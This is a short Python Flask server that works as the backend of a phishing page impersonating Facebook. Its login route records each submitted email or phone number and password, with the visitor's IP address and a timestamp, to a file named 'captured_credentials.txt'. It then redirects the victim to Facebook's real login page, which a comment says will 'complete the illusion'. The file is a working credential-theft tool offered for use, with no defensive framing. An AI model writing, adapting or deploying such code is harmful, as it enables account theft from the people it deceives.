# server.py
from flask import Flask, render_template, request, redirect
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip_address = request.remote_addr
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_entry = f"[{timestamp}] IP: {ip_address} | Email/Phone: {email} | Password: {password}\n"
    
    with open('captured_credentials.txt', 'a') as f:
        f.write(log_entry)

    # Redirect target to official site to complete illusion
    return redirect('https://www.facebook.com/login')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
    
